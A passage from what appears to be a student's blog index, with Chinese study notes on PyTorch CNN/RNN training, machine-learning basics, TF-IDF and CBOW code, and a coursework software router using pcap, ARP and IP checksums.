b_y) # cross entropy loss optimizer.zero_grad() # clear gradients for this training step loss.backward() # backpropagation, compute gradients optimizer.step() # apply gradients if step%50==0: test_output=cnn(test_x) pred_y=torch.max(test_output,1)[1].data.squeeze() accuracy=float(sum(pred_y==test_y))/test_y.size(0) print('Epoch:',epoch,'| train loss %.4f' % loss.data,'| test accuracy: %.2f'% accuracy) Epoch: 0 | train loss 2.2979 | test accuracy: 0.13Epoch: 0 | train loss 0.2706 | test accuracy: 0.84Epoch: 0 | train loss 0.2919 | test accuracy: 0.89Epoch: 0 | train loss 0.1879 | test accuracy: 0.92 …… 输出test_output = cnn(test_x[:10])\"\"\"torch.max用于分类问题，选取最大的概率torch.max(input,dim)input是softmax函数输出的一个tensordim是max函数索引的维度0/1，0是每列的最大值，1是每行的最大值函数会返回两个tensor，第一个tensor是每行的最大值；第二个tensor是每行最大值的索引。\"\"\"pred_y = torch.max(test_output, 1)[1].data.numpy().squeeze()print(pred_y, 'prediction number')print(test_y[:10].numpy(), 'real number') RNN数据间的顺序关联 分类import torchfrom torch import nnimport torchvision.datasets as dsetsimport torchvision.transforms as transformsimport matplotlib.pyplot as plttorch.manual_seed(1) # reproducible# Hyper ParametersEPOCH = 1 # 训练整批数据多少次, 为了节约时间, 我们只训练一次BATCH_SIZE = 64TIME_STEP = 28 # rnn 时间步数 / 图片高度 每28步中的一步读取一行信息INPUT_SIZE = 28 # rnn 每步输入值 / 图片每行像素 一行信息包括28个像素点LR = 0.01 # learning rateDOWNLOAD_MNIST = True # 如果你已经下载好了mnist数据就写上 Fasletrain_data = dsets.MNIST(root='./mnist', train=True, transform=transforms.ToTensor(), download=DOWNLOAD_MNIST)test_data = dsets.MNIST(root='./mnist', train=False)train_loader = torch.utils.data.DataLoader(dataset=train_data, batch_size=BATCH_SIZE, shuffle=True)test_x = test_data.data.type(torch.FloatTensor)[:2000] / 255test_y = test_data.targets[:2000]class RNN(nn.Module): def __init__(self): super(RNN, self).__init__() self.rnn = nn.LSTM( # 使用rnn准确度不高 input_size=INPUT_SIZE, # 图片每层的像素点 hidden_size=64, batch_first=True, # batch_size是否在第一维度 ) self.out = nn.Linear(64, 10) def forward(self, x): # x shape (batch, time_step, input_size) # r_out shape (batch, time_step, output_size) # h_n shape (n_layers, batch, hidden_size) LSTM 有两个 hidden states, h_n 是分线, h_c 是主线 # h_c shape (n_layers, batch, hidden_size) # None 是否有第一个hidden state r_out, (h_n, h_c) = self.rnn(x, None) # 28个output # 选最后一个output(读完所有数据) out = self.out(r_out[:, -1, :]) # (batch,time step,input) # print(r_out) return out # 这里还有点不明白，需要补充别的视频看一下rnn = RNN()optimizer = torch.optim.Adam(rnn.parameters(), lr=LR) # optimize all parametersloss_func = nn.CrossEntropyLoss() # the target label is not one-hottedfor epoch in range(EPOCH): for step, (x, b_y) in enumerate(train_loader): b_x = x.view(-1, 28, 28) # reshape x to (batch,time_step,input_size) output = rnn(b_x) # rnn output loss = loss_func(output, b_y) # cross entropy loss optimizer.zero_grad() # clear gradients for this training step loss.backward() # backpropagation, compute gradients optimizer.step() # apply gradients # 每50步 if step % 50 == 0: test_output = rnn(test_x) #torch.max(input,dim) input是softmax函数输出的一个tensor # dim是max函数索引的维度0/1，0是每列的最大值，1是每行的最大值 # 函数会返回两个tensor，第一个tensor是每行的最大值；第二个tensor是每行最大值的索引 pred_y = torch.max(test_output, 1)[1].data.squeeze() # torch.size()返回（行，列） accuracy = float(sum(pred_y == test_y)) / test_y.size(0) print('Epoch:', epoch, '| train loss %.4f' % loss.data, '| test accuracy: %.2f' % accuracy)test_output = rnn(test_x[:10].view(-1, 28, 28))pred_y = torch.max(test_output, 1)[1].data.numpy().squeeze()print(pred_y, 'prediction number')print(test_y[:10], 'real number') RNN( (rnn): LSTM(28, 64, batch_first=True) (out): Linear(in_features=64, out_features=10, bias=True)) Epoch: 0 | train loss 2.2883 | test accuracy: 0.10Epoch: 0 | train loss 0.8795 | test accuracy: 0.57Epoch: 0 | train loss 1.0830 | test accuracy: 0.76 回归用sin预测cos import torchfrom torch import nnimport numpy as npimport matplotlib.pyplot as plt# torch.manual_seed(1) # reproducible# Hyper ParametersTIME_STEP = 10 # rnn time stepINPUT_SIZE = 1 # rnn input sizeLR = 0.02 # learning rate# show datasteps = np.linspace(0, np.pi * 2, 100, dtype=np.float32) # float32 for converting torch FloatTensorx_np = np.sin(steps)y_np = np.cos(steps)plt.plot(steps, y_np, 'r-', label='target (cos)')plt.plot(steps, x_np, 'b-', label='input (sin)')plt.legend(loc='best')plt.show()class RNN(nn.Module): def __init__(self): super(RNN, self).__init__() self.rnn = nn.RNN( input_size=INPUT_SIZE,# 1 用sin的数据预测cos hidden_size=32, # rnn hidden unit（time step） num_layers=1, # number of rnn layer batch_first=True, # input &amp; output will has batch size as 1s dimension. e.g. (batch, time_step, input_size) ) self.out = nn.Linear(32, 1) def forward(self, x, h_state): # x (batch, time_step, input_size) # h_state (n_layers, batch, hidden_size) # r_out (batch, time_step, hidden_size) r_out, h_state = self.rnn(x, h_state) # 将状态当作下一步的输入 # r_outb包含所有的out但是h——state只包含最后一个 outs = [] # save all predictions for time_step in range(r_out.size(1)): # calculate output for each time step outs.append(self.out(r_out[:, time_step, :])) # 将list变成tensor return torch.stack(outs, dim=1), h_state # instead, for simplicity, you can replace above codes by follows # r_out = r_out.view(-1, 32) # outs = self.out(r_out) # outs = outs.view(-1, TIME_STEP, 1) # return outs, h_state # or even simpler, since nn.Linear can accept inputs of any dimension # and returns outputs with same dimension except for the last # outs = self.out(r_out) # return outsrnn = RNN()print(rnn)optimizer = torch.optim.Adam(rnn.parameters(), lr=LR) # optimize all cnn parametersloss_func = nn.MSELoss()h_state = None # for initial hidden stateplt.figure(1, figsize=(12, 5))plt.ion() # continuously plotfor step in range(100): start, end = step * np.pi, (step + 1) * np.pi # time range # use sin predicts cos steps = np.linspace(start, end, TIME_STEP, dtype=np.float32, endpoint=False) # float32 for converting torch FloatTensor x_np = np.sin(steps) y_np = np.cos(steps) x = torch.from_numpy(x_np[np.newaxis, :, np.newaxis]) # shape (batch, time_step, input_size) y = torch.from_numpy(y_np[np.newaxis, :, np.newaxis]) prediction, h_state = rnn(x, h_state) # rnn output # !! next step is important !! h_state = h_state.data # repack the hidden state, break the connection from last iteration loss = loss_func(prediction, y) # calculate loss optimizer.zero_grad() # clear gradients for this training step loss.backward() # backpropagation, compute gradients optimizer.step() # apply gradients # plotting plt.plot(steps, y_np.flatten(), 'r-') plt.plot(steps, prediction.data.numpy().flatten(), 'b-') plt.draw() plt.pause(0.05)plt.ioff()plt.show() LSTM解决RNN的梯度消失和梯度爆炸 增加输入控制、输出控制和忘记控制 感觉RNN部分没听太明白，还需要补充其它资料再学一下","categories":[{"name":"pytorch","slug":"pytorch","permalink":"https://gitee.com/michelle19l/michelle19l/categories/pytorch/"}],"tags":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"机器学习","slug":"机器学习","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"pytorch","slug":"pytorch","permalink":"https://gitee.com/michelle19l/michelle19l/tags/pytorch/"}]},{"title":"机器学习/机器学习基础","slug":"机器学习/机器学习基础","date":"2021-02-21T11:20:26.863Z","updated":"2021-02-21T11:20:26.863Z","comments":true,"path":"2021/02/21/机器学习/机器学习基础/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/","excerpt":"","text":"课程：莫烦python 机器学习方法监督学习：有数据有标签无监督学习：只有数据没有标签半监督学习（类似聚类） 强化学习遗传算法 神经网络科普人的神经网络：修正神经元之间的连接直至达到运动目的计算机的神经网络 计算机神经网络模型 自适应 利用统计建立输入和输出的关系 输出层：认知结果 错误判断-&gt;反向传递修改结点敏感度 刺激函数 卷积神经网络（CNN） 一个像素点-&gt;一小块像素点图片信息的连续性 池化 循环神经网络（RNN）数据的顺序 记住发生的事情 每分析完一组数据会产生相应的状态参加下一组数据的处理 LSTM RNN 循环神经网络long short term memory 普通RNN： 梯度消失和梯度爆炸 $w^n$ 无法回忆起救援记忆 LSMT 主线的更新取决于输入和忘记控制 输出：基于主线和分线 自编码 Autoencoder一种神经网络形式 提取具有代表性的信息，减小同时处理的神经元数量 生成对抗网络 GAN利用没有意义的随机数生成输出 机器（discriminator）对输出进行判断和学习，并向随机数处理过程（gennerator）进行反馈 神经网络的黑盒黑盒：人不能直接理解的中间结果 将一种代表特征转化成另一种 梯度下降 gradient descent in neural netsoptimization cost function 很多时候都只能找到局部最优 迁移学习 Transfer learning借鉴其它已经训练好的模型 适用于大型的模型 神经网络技巧检验神经网络学习效率不高或效果不好 训练数据0.7&amp;测试数据0.3 误差 精确度 过拟合 交叉验证 找到满足误差要求且节约资源的层 特征标准化使数据跨度尽量统一，加快学习速率、提升学习效果 区分好用的特征更容易得到结果 eg.可以区分种类的特征 避免重复性信息、无意义信息、复杂信息 激励函数线性方程“掰弯” 可能会导致梯度爆炸和梯度消失 过拟合在小范围数据内表现良好，但是大范围数据不好 解决方法：增加数据量、正规化 L1L2： dropout：随机丢弃神经元 加速神经网络训练SGD：将数据分成多批 momentum adagrad 处理不均衡数据 获取更多的数据 使用其它评判方式 重组数据，调配比例 使用其它机器学习算法 修改算法 批标准化（还是没太懂，回来再看看） 例tan，对绝对值较大的数据差距不敏感 数据分成批，对每一层进行标准化 L1/L2正规化防止过拟合 自然语言处理什么是自然语言处理将句子转化成数字，进行后续处理 搜索引擎是怎么工作的文字：提取关键词赋予权重构成索引 倒排索引-&gt;批量召回：先构建文章和索引的对应关系，搜索时返回索引对应的文章 匹配排序：TF-IDF（粗排）相似度评分 TF：词频IDF：词的区分度两者相乘 搜索向量和文章向量进行比对，返回距离最近的向量 机器理解语言的方式 词向量技术相近的内容-》向量距离小 相似度-》向量夹角的cos 越有区分力的词越远离中间地区 语言模型的注意力注意到一个或多个词汇 句向量通过全局信息生成对话","categories":[],"tags":[]},{"title":"python/nlp/莫烦python","slug":"python/nlp/莫烦python","date":"2021-01-30T15:56:51.786Z","updated":"2021-01-30T15:56:51.786Z","comments":true,"path":"2021/01/30/python/nlp/莫烦python/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/python/nlp/%E8%8E%AB%E7%83%A6python/","excerpt":"","text":"网站：七月在线 https://mofanpy.com/tutorials/machine-learning/nlp/ 深度学习相对于大数据需要更长的时间 TF-IDF 语言向量化 TF：词频 IDF：突出关键词，和其它文档中不同的部分 import numpy as npfrom collections import Counterimport itertoolsfrom visual import show_tfidf # this refers to visual.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)docs = [ \"it is a good day, I like to stay here\", \"I am happy to be here\", \"I am bob\", \"it is sunny today\", \"I have a party today\", \"it is a dog and that is a cat\", \"there are dog and cat on the tree\", \"I study hard this morning\", \"today is a good day\", \"tomorrow will be a good day\", \"I like coffee, I like book and I like apple\", \"I do not like it\", \"I am kitty, I like bob\", \"I do not care who like bob, but I like kitty\", \"It is coffee time, bring your cup\",]# 将文档的单词转换成ID形式docs_words = [d.replace(\",\", \"\").split(\" \") for d in docs]vocab = set(itertools.chain(*docs_words))v2i = &#123;v: i for i, v in enumerate(vocab)&#125;i2v = &#123;i: v for v, i in v2i.items()&#125;def safe_log(x): mask = x != 0 x[mask] = np.log(x[mask]) return xtf_methods = &#123; \"log\": lambda x: np.log(1+x), \"augmented\": lambda x: 0.5 + 0.5 * x / np.max(x, axis=1, keepdims=True), \"boolean\": lambda x: np.minimum(x, 1), \"log_avg\": lambda x: (1 + safe_log(x)) / (1 + safe_log(np.mean(x, axis=1, keepdims=True))), &#125;idf_methods = &#123; \"log\": lambda x: 1 + np.log(len(docs) / (x+1)), \"prob\": lambda x: np.maximum(0, np.log((len(docs) - x) / (x+1))), \"len_norm\": lambda x: x / (np.sum(np.square(x))+1), &#125;def get_tf(method=\"log\"): # term frequency: how frequent a word appears in a doc _tf = np.zeros((len(vocab), len(docs)), dtype=np.float64) # [n_vocab, n_doc] for i, d in enumerate(docs_words): counter = Counter(d) for v in counter.keys(): _tf[v2i[v], i] = counter[v] / counter.most_common(1)[0][1] weighted_tf = tf_methods.get(method, None) if weighted_tf is None: raise ValueError return weighted_tf(_tf)def get_idf(method=\"log\"): # inverse document frequency: low idf for a word appears in more docs, mean less important df = np.zeros((len(i2v), 1)) for i in range(len(i2v)): d_count = 0 for d in docs_words: d_count += 1 if i2v[i] in d else 0 df[i, 0] = d_count idf_fn = idf_methods.get(method, None) if idf_fn is None: raise ValueError return idf_fn(df)def cosine_similarity(q, _tf_idf): unit_q = q / np.sqrt(np.sum(np.square(q), axis=0, keepdims=True)) unit_ds = _tf_idf / np.sqrt(np.sum(np.square(_tf_idf), axis=0, keepdims=True)) similarity = unit_ds.T.dot(unit_q).ravel() return similaritydef docs_score(q, len_norm=False): q_words = q.replace(\",\", \"\").split(\" \") # add unknown words unknown_v = 0 for v in set(q_words): if v not in v2i: v2i[v] = len(v2i) i2v[len(v2i)-1] = v unknown_v += 1 if unknown_v &gt; 0: _idf = np.concatenate((idf, np.zeros((unknown_v, 1), dtype=np.float)), axis=0) _tf_idf = np.concatenate((tf_idf, np.zeros((unknown_v, tf_idf.shape[1]), dtype=np.float)), axis=0) else: _idf, _tf_idf = idf, tf_idf counter = Counter(q_words) q_tf = np.zeros((len(_idf), 1), dtype=np.float) # [n_vocab, 1] for v in counter.keys(): q_tf[v2i[v], 0] = counter[v] q_vec = q_tf * _idf # [n_vocab, 1] q_scores = cosine_similarity(q_vec, _tf_idf) if len_norm: len_docs = [len(d) for d in docs_words] q_scores = q_scores / np.array(len_docs) return q_scoresdef get_keywords(n=2): for c in range(3): col = tf_idf[:, c] idx = np.argsort(col)[-n:]# 将矩阵col按照axis（默认-1）进行排序，返回排序后的下标 print(\"doc&#123;&#125;, top&#123;&#125; keywords &#123;&#125;\".format(c, n, [i2v[i] for i in idx]))tf = get_tf() # [n_vocab, n_doc]idf = get_idf() # [n_vocab, 1]tf_idf = tf * idf # [n_vocab, n_doc]print(\"tf shape(vecb in each docs): \", tf.shape)print(\"\\ntf samples:\\n\", tf[:2])print(\"\\nidf shape(vecb in all docs): \", idf.shape)print(\"\\nidf samples:\\n\", idf[:2])print(\"\\ntf_idf shape: \", tf_idf.shape)print(\"\\ntf_idf sample:\\n\", tf_idf[:2])# testget_keywords()q = \"I get a coffee cup\"scores = docs_score(q)d_ids = scores.argsort()[-3:][::-1]print(\"\\ntop 3 docs for '&#123;&#125;':\\n&#123;&#125;\".format(q, [docs[i] for i in d_ids]))show_tfidf(tf_idf.T, [i2v[i] for i in range(tf_idf.shape[0])], \"tfidf_matrix\") Sklearn稀疏向量 from sklearn.feature_extraction.text import TfidfVectorizerfrom sklearn.metrics.pairwise import cosine_similarityfrom visual import show_tfidf # this refers to visual.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)docs = [ \"it is a good day, I like to stay here\", \"I am happy to be here\", \"I am bob\", \"it is sunny today\", \"I have a party today\", \"it is a dog and that is a cat\", \"there are dog and cat on the tree\", \"I study hard this morning\", \"today is a good day\", \"tomorrow will be a good day\", \"I like coffee, I like book and I like apple\", \"I do not like it\", \"I am kitty, I like bob\", \"I do not care who like bob, but I like kitty\", \"It is coffee time, bring your cup\",]vectorizer = TfidfVectorizer()tf_idf = vectorizer.fit_transform(docs)#打印idf值print(\"idf: \", [(n, idf) for idf, n in zip(vectorizer.idf_, vectorizer.get_feature_names())])#打印词语和idf的对应print(\"v2i: \", vectorizer.vocabulary_)q = \"I get a coffee cup\"qtf_idf = vectorizer.transform([q])#计算q的idfres = cosine_similarity(tf_idf, qtf_idf) #比对res = res.ravel().argsort()[-3:]print(\"\\ntop 3 docs for '&#123;&#125;':\\n&#123;&#125;\".format(q, [docs[i] for i in res[::-1]]))i2v = &#123;i: v for v, i in vectorizer.vocabulary_.items()&#125;dense_tfidf = tf_idf.todense()show_tfidf(dense_tfidf, [i2v[i] for i in range(dense_tfidf.shape[1])], \"tfidf_sklearn_matrix\") CBOW预测词和前后文之间的关系 # [Efficient Estimation of Word Representations in Vector Space](https://arxiv.org/pdf/1301.3781.pdf)from tensorflow import kerasimport tensorflow as tffrom utils import process_w2v_data # this refers to utils.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)from visual import show_w2v_word_embedding # this refers to visual.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)corpus = [ # numbers \"5 2 4 8 6 2 3 6 4\", \"4 8 5 6 9 5 5 6\", \"1 1 5 2 3 3 8\", \"3 6 9 6 8 7 4 6 3\", \"8 9 9 6 1 4 3 4\", \"1 0 2 0 2 1 3 3 3 3 3\", \"9 3 3 0 1 4 7 8\", \"9 9 8 5 6 7 1 2 3 0 1 0\", # alphabets, expecting that 9 is close to letters \"a t g q e h 9 u f\", \"e q y u o i p s\", \"q o 9 p l k j o k k o p\", \"h g y i u t t a e q\", \"i k d q r e 9 e a d\", \"o p d g 9 s a f g a\", \"i u y g h k l a s w\", \"o l u y a o g f s\", \"o p i u y g d a s j d l\", \"u k i l o 9 l j s\", \"y g i s h k j l f r f\", \"i o h n 9 9 d 9 f a 9\",]class CBOW(keras.Model): def __init__(self, v_dim, emb_dim): super().__init__() self.v_dim = v_dim self.embeddings = keras.layers.Embedding( input_dim=v_dim, output_dim=emb_dim, # [n_vocab, emb_dim] embeddings_initializer=keras.initializers.RandomNormal(0., 0.1), ) # noise-contrastive estimation self.nce_w = self.add_weight( name=\"nce_w\", shape=[v_dim, emb_dim], initializer=keras.initializers.TruncatedNormal(0., 0.1)) # [n_vocab, emb_dim] self.nce_b = self.add_weight( name=\"nce_b\", shape=(v_dim,), initializer=keras.initializers.Constant(0.1)) # [n_vocab, ] self.opt = keras.optimizers.Adam(0.01) def call(self, x, training=None, mask=None): # x.shape = [n, skip_window*2] o = self.embeddings(x) # [n, skip_window*2, emb_dim] o = tf.reduce_mean(o, axis=1) # [n, emb_dim] return o # negative sampling: take one positive label and num_sampled negative labels to compute the loss # in order to reduce the computation of full softmax def loss(self, x, y, training=None): embedded = self.call(x, training) return tf.reduce_mean( tf.nn.nce_loss( weights=self.nce_w, biases=self.nce_b, labels=tf.expand_dims(y, axis=1), inputs=embedded, num_sampled=5, num_classes=self.v_dim)) def step(self, x, y): with tf.GradientTape() as tape: loss = self.loss(x, y, True) grads = tape.gradient(loss, self.trainable_variables) self.opt.apply_gradients(zip(grads, self.trainable_variables)) return loss.numpy()def train(model, data): for t in range(2500): bx, by = data.sample(8) loss = model.step(bx, by) if t % 200 == 0: print(\"step: &#123;&#125; | loss: &#123;&#125;\".format(t, loss))if __name__ == \"__main__\": #skip_window 取词区间，2-5 d = process_w2v_data(corpus, skip_window=2, method=\"cbow\") m = CBOW(d.num_word, 2) train(m, d) # plotting show_w2v_word_embedding(m, d, \"./visual/results/cbow.png\")","categories":[],"tags":[]},{"title":"网络技术与应用大作业 简单路由器程序的设计","slug":"大三上/计网/网技大作业路由器","date":"2021-01-30T04:00:10.000Z","updated":"2021-02-22T14:43:11.351Z","comments":true,"path":"2021/01/30/大三上/计网/网技大作业路由器/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E5%A4%A7%E4%BD%9C%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8/","excerpt":"","text":"设计性大作业（1） 简单路由器程序的设计内容说明简单路由器程序设计实验的具体要求为： （1）设计和实现一个路由器程序，要求完成的路由器程序能和现有的路由器产品（如思科路由器、华为路由器、微软的路由器等）进行协同工作。 （2）程序可以仅实现IP数据报的获取、选路、投递等路由器要求的基本功能。可以忽略分片处理、选项处理、动态路由表生成等功能。 （3）需要给出路由表的手工插入、删除方法。 （4）需要给出路由器的工作日志，显示数据报获取和转发过程。 （5）完成的程序须通过现场测试，并在班（或小组）中展示和报告自己的设计思路、开发和实现过程、测试方法和过程。 第1节 实验步骤实验设计思路路由器工作流程 具体工作流程详见下一部分的代码解析 关键代码分析报文格式#pragma pack(1)//以1byte方式对齐#pragma pack()//恢复4bytes对齐 报文首部 typedef struct FrameHeader_t &#123;//帧首部 BYTE DesMAC[6];//目的地址 BYTE SrcMAC[6];//源地址 WORD FrameType;//帧类型&#125;FrameHeader_t; ARP报文格式 typedef struct ARPFrame_t &#123; FrameHeader_t FrameHeader;//帧首部 WORD HardwareType;//硬件类型 WORD ProtocolType;//协议类型 BYTE HLen;//硬件地址长度 BYTE PLen;//协议地址 WORD Operation;//操作 BYTE SendHa[6];//发送方MAC DWORD SendIP;//发送方IP BYTE RecvHa[6];//接收方MAC DWORD RecvIP;//接收方IP&#125;ARPFrame_t; IP报文首部 typedef struct IPHeader_t &#123;//IP首部 BYTE Ver_HLen; BYTE TOS; WORD TotalLen; WORD ID; WORD Flag_Segment; BYTE TTL;//生命周期 BYTE Protocol; WORD Checksum;//校验和 ULONG SrcIP;//源IP ULONG DstIP;//目的IP&#125;IPHeader_t; typedef struct Data_t &#123;//包含帧首部和IP首部的数据包 FrameHeader_t FrameHeader;//帧首部 IPHeader_t IPHeader;//IP首部&#125;Data_t; ICMP报文格式 由于本次实验只对ICMP数据报进行简单解析，不需要复杂操作，所以只用char*表示即可 typedef struct ICMP &#123;//包含帧首部和IP首部的数据包 FrameHeader_t FrameHeader; IPHeader_t IPHeader; char buf[0x80];&#125;ICMP_t; 存储结构路由表表项 class routeitem&#123;public: DWORD mask;//掩码 DWORD net;//目的网络 DWORD nextip;//下一跳 int index;//第几条 int type;//0为直接连接，1为用户添加，1不可删除 routeitem* nextitem;//采用链表形式存储 routeitem() &#123; memset(this, 0, sizeof(*this));//初始化为全0 &#125; void printitem();//打印表项内容，打印出掩码、目的网络和下一跳IP、类型（是否是直接投递）&#125;; 路由表 class routetable&#123;public: routeitem* head, * tail;//支持最多添加50转发表 int num;//条数 routetable();//初始化，添加直接连接的网络 //路由表的添加，直接投递在最前，前缀长的在前面 void add(routeitem* a); //删除，type=0不能删除 void remove(int index); //路由表的打印 mask net next type void print(); //查找，最长前缀,返回下一跳的ip DWORD lookup(DWORD ip);&#125;; routetable::routetable()//初始化，添加直接连接的网络&#123; head = new routeitem; tail = new routeitem; head-&gt;nextitem = tail; num = 0; for (int i = 0; i &lt; 2; i++) &#123; routeitem* temp = new routeitem; temp-&gt;net = (inet_addr(ip[i])) &amp; (inet_addr(mask[i]));//本机网卡的ip和掩码进行按位与即为所在网络 temp-&gt;mask = inet_addr(mask[i]); temp-&gt;type = 0;//0表示直接投递的网络，不可删除 this-&gt;add(temp);//添加表项 &#125;&#125; ARP表 为减少发送ARP请求的次数，将IP和MAC的对应关系存储在一张表里，在实际情况中需要设置表项的生命周期，防止一段时间后个别表项IP和MAC出现不对应的情况，本次实验较为简单，故没有设置 class arptable&#123;public: DWORD ip;//IP BYTE mac[6];//MAC static int num;//表项个数 static void insert(DWORD ip,BYTE mac[6]);//插入 static int lookup(DWORD ip, BYTE mac[6]);//查询&#125;atable[50]; 日志 本次实验需要输出路由器的工作日志 class log&#123;public: int index;//索引 char type[5];//arp和ip //具体内容 ipitem ip; arpitem arp; log();//打开文件进行写入 ~log();//关闭文件 static int num;//数量 static log diary[50];//日志 static FILE* fp; //写入日志 static void write2log_arp(ARPFrame_t*);//arp类型 static void write2log_ip(const char* a,Data_t*);//ip类型 static void print();//打印日志&#125;; class arpitem//arp日志为ip和对应MAC&#123;public: DWORD ip; BYTE mac[6];&#125;;class ipitem&#123;public: DWORD sip, dip;//ip日志为源和目的的IP和mac BYTE smac[6], dmac[6];&#125;; 主要函数//获取自己的IPvoid find_alldevs(); //获取本机的设备列表，将两个ip存入ip数组中,获取IP、mask，计算所在网段DWORD getnet(DWORD ip, DWORD mask);//根据ip和掩码计算所在网络//打开网络接口pcap_t* open(char* name);//获取自己的MACvoid getselfmac(DWORD ip);//获取直接连接的网卡macvoid getothermac(DWORD mask_, DWORD ip, BYTE mac[]);//显示基本信息 本机ip，macvoid printbasicinfo();//数据报转发,修改源mac和目的macvoid resend(ICMP_t, BYTE dmac[]);//打印macvoid getmac(BYTE MAC[]);//线程函数DWORD WINAPI handlerRequest(LPVOID lparam);void ipprint(DWORD ip);//检查和设置校验和bool checkchecksum(Data_t*);void setchecksum(Data_t*); find_alldevs获取本机网卡的IP void find_alldevs() //获取网卡上的IP&#123; //获取网卡列表 if (pcap_findalldevs_ex(pcap_src_if_string, NULL, &amp;alldevs, errbuf) == -1) &#123; printf(\"%s\", \"error\"); &#125; else &#123; int i = 0; d = alldevs; //获取该网络接口设备的ip地址信息 for (; d != NULL; d = d-&gt;next) &#123; if (i == index) &#123; net[i] = d; int t = 0; for (a = d-&gt;addresses; a != nullptr; a = a-&gt;next) &#123; if (((struct sockaddr_in*)a-&gt;addr)-&gt;sin_family == AF_INET &amp;&amp; a-&gt;addr) &#123; //将对应第index块网卡的内容存入全局数组 strcpy(ip[t], inet_ntoa(((struct sockaddr_in*)a-&gt;addr)-&gt;sin_addr)); strcpy(mask[t++], inet_ntoa(((struct sockaddr_in*)a-&gt;netmask)-&gt;sin_addr)); &#125; &#125; ahandle = open(d-&gt;name);//打开该网卡 &#125; i++; &#125; &#125; pcap_freealldevs(alldevs);&#125; open打开网络接口 pcap_t* open(char* name)//打开网络接口，返回网卡指针&#123; pcap_t* temp = pcap_open(name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 100, NULL, errbuf); if (temp == NULL) printf(\"error\"); return temp;&#125; ==getselfmac和getothermac获取MAC地址== 由于获取本机的MAC和其它机器的MAC地址逻辑相似，这里只详细说明一个 void getothermac(DWORD ip_, BYTE mac[])//获取ip对应的mac&#123; memset(mac, 0, sizeof(mac)); ARPFrame_t ARPFrame; //将APRFrame.FrameHeader.DesMAC设置为广播地址 for (int i = 0; i &lt; 6; i++) ARPFrame.FrameHeader.DesMAC[i] = 0xff; //将APRFrame.FrameHeader.SrcMAC设置为本机网卡的MAC地址，若获取本机MAC，则伪造一个即可 for (int i = 0; i &lt; 6; i++) &#123; ARPFrame.FrameHeader.SrcMAC[i] = selfmac[i]; ARPFrame.SendHa[i] = selfmac[i]; &#125; ARPFrame.FrameHeader.FrameType = htons(0x806);//帧类型为ARP ARPFrame.HardwareType = htons(0x0001);//硬件类型为以太网 ARPFrame.ProtocolType = htons(0x0800);//协议类型为IP ARPFrame.HLen = 6;//硬件地址长度为6 ARPFrame.PLen = 4;//协议地址长为4 ARPFrame.Operation = htons(0x0001);//操作为ARP请求 //将ARPFrame.SendIP设置为本机网卡上绑定的IP地址，若获取本机MAC，则伪造发送IP和MAC ARPFrame.SendIP = inet_addr(ip[0]); //ipprint(ARPFrame.SendIP); //将ARPFrame.RecvHa设置为0 for (int i = 0; i &lt; 6; i++) ARPFrame.RecvHa[i] = 0; //将ARPFrame.RecvIP设置为请求的IP地址 ARPFrame.RecvIP = ip_; u_char* h = (u_char*)&amp;ARPFrame; int len = sizeof(ARPFrame_t); if (ahandle == nullptr) printf(\"网卡接口打开错误\\n\"); else &#123; if (pcap_sendpacket(ahandle, (u_char*)&amp;ARPFrame, sizeof(ARPFrame_t)) != 0) &#123; //发送错误处理 printf(\"senderror\\n\"); &#125; else &#123; //发送成功 while (1) &#123; pcap_pkthdr* pkt_header; const u_char* pkt_data; int rtn = pcap_next_ex(ahandle, &amp;pkt_header, &amp;pkt_data);//捕获数据报 if (rtn == 1)//捕获到数据报 &#123; ARPFrame_t* IPPacket = (ARPFrame_t*)pkt_data; if (ntohs(IPPacket-&gt;FrameHeader.FrameType) == 0x806)//筛选ARP类型的消息进行处理 &#123; if (!compare(IPPacket-&gt;FrameHeader.SrcMAC, ARPFrame.FrameHeader.SrcMAC) &amp;&amp; compare(IPPacket-&gt;FrameHeader.DesMAC, ARPFrame.FrameHeader.SrcMAC) &amp;&amp; IPPacket-&gt;SendIP == ip_)//消息筛选 &#123; ltable.write2log_arp(IPPacket); //源MAC地址即为所需MAC地址 for (int i = 0; i &lt; 6; i++) &#123; mac[i] = IPPacket-&gt;FrameHeader.SrcMAC[i]; &#125; break;//已经捕获到MAC，可以退出函数 &#125; &#125; &#125; &#125; &#125; &#125;&#125; ==setchecksum和checkchecesum设置校验和和检验校验和== void setchecksum(Data_t* temp)//设置校验和&#123; temp-&gt;IPHeader.Checksum = 0; unsigned int sum = 0; WORD* t = (WORD*)&amp;temp-&gt;IPHeader;//每16位为一组 for (int i = 0; i &lt; sizeof(IPHeader_t)/2; i++) &#123; sum += t[i]; while (sum &gt;= 0x10000)//如果溢出，则进行回卷 &#123; int s = sum &gt;&gt; 16; sum -= 0x10000; sum += s; &#125; &#125; temp-&gt;IPHeader.Checksum = ~sum;//结果取反&#125; bool checkchecksum(Data_t* temp)//检验&#123; unsigned int sum = 0; WORD* t = (WORD*)&amp;temp-&gt;IPHeader; for (int i = 0; i &lt; sizeof(IPHeader_t) / 2; i++) &#123; sum += t[i]; while (sum &gt;= 0x10000)//包含原有校验和一起进行相加 &#123; int s = sum &gt;&gt; 16; sum -= 0x10000; sum += s; &#125; &#125; if (sum == 65535)//源码+反码-》全1 return 1;//校验和正确 return 0;&#125; ==接收和处理线程函数== 为使消息转发和路由表添加、删除、打印等操作可以同时进行，使用线程函数进行消息内容处理 DWORD WINAPI handlerRequest(LPVOID lparam)&#123; routetable rtable = *(routetable*)(LPVOID)lparam; while (1) &#123; pcap_pkthdr* pkt_header; const u_char* pkt_data; 